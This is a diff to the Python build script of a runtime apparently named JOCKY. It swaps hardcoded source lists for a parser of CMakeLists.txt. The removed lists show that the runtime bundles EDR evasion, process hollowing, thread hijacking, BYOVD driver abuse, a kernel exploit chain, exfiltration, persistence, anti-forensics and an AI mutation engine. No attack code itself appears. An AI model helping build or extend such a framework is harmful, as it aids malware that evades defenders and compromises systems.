@@ -393,13 +393,63 @@ def stage_compile(bc_path, build_dir, platform="windows"):
     return obj_path
 
 
+def _parse_cmake_runtime_sources(runtime_dir, platform):
+    """Read RUNTIME_SOURCES from CMakeLists.txt and apply platform REMOVE_ITEM filtering."""
+    cmake_file = runtime_dir / "CMakeLists.txt"
+    content = cmake_file.read_text()
+    lines = content.split('\n')
+
+    all_sources = []
+    in_set_block = False
+    for line in lines:
+        s = line.strip()
+        if 'set(RUNTIME_SOURCES' in s:
+            in_set_block = True
+            continue
+        if in_set_block:
+            if s.startswith(')'):
+                break
+            if s and not s.startswith('#') and '${' not in s:
+                all_sources.append(s)
+
+    # Match the exact CMake condition to avoid 'WIN32' matching inside 'if(UNIX OR NOT WIN32)'
+    if platform == 'linux':
+        import re as _re
+        target_pattern = _re.compile(r'\bif\s*\(\s*UNIX\s+OR\s+NOT\s+WIN32\s*\)')
+    else:
+        import re as _re
+        target_pattern = _re.compile(r'\belseif\s*\(\s*WIN32\s*\)')
+    remove_items = set()
+    in_platform_if = False
+    in_remove_list = False
+    for line in lines:
+        s = line.strip()
+        if not in_platform_if:
+            if target_pattern.search(s):
+                in_platform_if = True
+        else:
+            if 'list(REMOVE_ITEM RUNTIME_SOURCES' in s:
+                in_remove_list = True
+                continue
+            if in_remove_list:
+                if s.startswith(')'):
+                    in_remove_list = False
+                    in_platform_if = False
+                    break
+                if s and not s.startswith('#'):
+                    remove_items.add(s)
+
+    filtered = [s for s in all_sources if s not in remove_items]
+    return [runtime_dir / s for s in filtered if (runtime_dir / s).exists()]
+
+
 def stage_compile_runtime(build_dir, platform="windows"):
     log("RUNTIME", f"Compiling JOCKY runtime for {platform.upper()}")
     include_dir = RUNTIME_DIR / "include"
     objs = []
 
-    # Linux now uses real runtime implementations instead of FFI shims
-    # All 113 functions implemented across Phases 1-4
+    sources = _parse_cmake_runtime_sources(RUNTIME_DIR, platform)
+    log("RUNTIME", f"  sources from CMakeLists.txt: {len(sources)} files")
 
     if platform == "linux":
         compiler = "gcc"
@@ -408,53 +458,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
                   "-I", str(RUNTIME_DIR),
                   "-I", str(RUNTIME_DIR / "linux")]
 
-        LINUX = RUNTIME_DIR / "linux"
-        sources = [
-            # Core runtime files (Phase 1-4 implementations)
-            LINUX / "io" / "io_core.c",                      # File I/O + output
-            LINUX / "core" / "runtime_init.c",               # Crypto + OpenSSL init
-            LINUX / "core" / "sandbox_ops.c",                # Namespace isolation
-            LINUX / "core" / "audit_ops.c",                  # Audit logging + threat scoring
-            LINUX / "core" / "remaining_stubs.c",            # Phase 3-4 implementations
-            LINUX / "anti_analysis" / "detection.c",         # Debugger/sandbox/VM detection
-            LINUX / "process" / "ptrace_control.c",          # PTRACE operations
-            LINUX / "process" / "thread_hijack.c",           # Thread code injection
-            LINUX / "process" / "process_hollow.c",          # Process replacement
-            LINUX / "kernel" / "kread_kwrite.c",             # Kernel memory access
-            LINUX / "kernel" / "byovd_ops.c",                # BYOVD driver operations
-            LINUX / "kernel" / "module_ops.c",               # Module resolution + syscall table
-            LINUX / "exploitation" / "fence2pwn.c",          # FENCE2PWN exploit chain
-            LINUX / "exfil" / "exfil_channels.c",            # Data exfiltration
-
-            # New APIs (Production scripts)
-            LINUX / "persistence" / "cron_systemd.c",       # Cron/systemd persistence
-            LINUX / "kernel" / "module_loader.c",           # Module loading & FENCE2PWN
-            LINUX / "missing_apis.c",                       # Additional missing runtime APIs
-            LINUX / "forensics" / "cleanup.c",               # Forensics cleanup
-            LINUX / "forensics" / "linux_forensics.c",       # Linux-specific forensics
-            RUNTIME_DIR / "common" / "encoding.c",           # Base64/hex encoding
-            RUNTIME_DIR / "ai" / "mutation_engine.c",        # AI-driven code mutations
-
-            # Legacy syscall files (if they exist and don't conflict)
-            RUNTIME_DIR / "util" / "mem.c",
-            RUNTIME_DIR / "compression" / "compression.c",
-            RUNTIME_DIR / "crypto" / "crypto.c",
-            RUNTIME_DIR / "core" / "plugin.c",
-            LINUX / "syscalls" / "syscall.c",
-            LINUX / "syscalls" / "file_syscall.c",
-            LINUX / "syscalls" / "util_syscall.c",
-            LINUX / "syscalls" / "env_syscall.c",
-            LINUX / "syscalls" / "dir_syscall.c",
-            LINUX / "syscalls" / "signal_syscall.c",
-            LINUX / "syscalls" / "ipc_syscall.c",
-            LINUX / "syscalls" / "sysinfo_syscall.c",
-            LINUX / "stubs.c",
-        ]
-
         for src in sources:
-            if not src.exists():
-                log("RUNTIME", f"  skip (not found): {src.name}")
-                continue
             obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
             try:
                 run([compiler] + cflags + ["-I", str(src.parent), str(src), "-o", str(obj)],
@@ -496,46 +500,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
                   "-I", str(RUNTIME_DIR),
                   "-I", str(RUNTIME_DIR / "windows")]
 
-    WIN = RUNTIME_DIR / "windows"
-    sources_win = [
-        # Windows utilities (cross-platform implementations)
-        WIN / "windows_utils.c",
-        # Windows-specific implementations
-        RUNTIME_DIR / "init" / "anti_analysis.c",
-        RUNTIME_DIR / "util" / "mem.c",
-        RUNTIME_DIR / "exfil" / "exfil.c",
-        RUNTIME_DIR / "ai" / "mutation_engine.c",
-        RUNTIME_DIR / "core" / "plugin.c",
-        RUNTIME_DIR / "core" / "sandbox.c",
-        WIN / "evasion" / "unhook.c",
-        WIN / "evasion" / "syscalls.c",
-        WIN / "evasion" / "stack_spoof.c",
-        WIN / "evasion" / "blindside.c",
-        WIN / "evasion" / "edrhoker.c",
-        WIN / "evasion" / "advanced_edr.c",
-        WIN / "evasion" / "edr_throttle_profiler.c",  # EDR profiler for adaptive behavior
-        WIN / "evasion" / "process_spoofing.c",  # Process name spoofing & kernel unhooking
-        WIN / "anti_forensics" / "cache_cleanup.c",  # Browser cache & history cleanup
-        WIN / "execution" / "hollow.c",
-        WIN / "execution" / "byovd.c",
-        WIN / "execution" / "inmem.c",
-        WIN / "execution" / "driver_interact.c",
-        WIN / "exploitation" / "kernel_exploit.c",
-        WIN / "byovd" / "btr_abuse.c",
-        RUNTIME_DIR / "byovd" / "byovd_modular.c",
-        RUNTIME_DIR / "byovd" / "driver_scoring.c",  # Driver intelligence scoring
-        WIN / "registry" / "registry.c",
-        WIN / "audit" / "audit.c",
-        WIN / "apis" / "complete_apis.c",
-        WIN / "anti_forensics" / "forensics.c",
-        WIN / "anti_forensics" / "logs.c",
-        WIN / "anti_forensics" / "self_delete.c",
-        WIN / "security" / "token_manipulation.c",
-        WIN / "exfil" / "enhanced_exfiltration.c",
-        WIN / "network" / "http.c",
-        RUNTIME_DIR / "common" / "encoding.c",
-        RUNTIME_DIR / "compression" / "compression_simple.c",
-    ]
+    sources_win = sources
 
     cflags_win = [
         "-O2", "-c", "-D_WIN32", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
